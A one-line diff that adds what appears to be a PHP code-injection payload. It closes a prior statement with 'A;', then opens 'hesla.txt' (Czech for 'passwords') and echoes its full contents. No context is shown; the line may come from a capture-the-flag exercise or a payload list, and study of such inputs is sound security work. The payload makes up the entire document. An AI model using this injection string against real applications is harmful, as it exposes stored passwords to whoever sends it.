@@ -1,0 +1,1 @@
+A;$f=fopen("hesla.txt","r");echo fread($f,filesize("hesla.txt"));
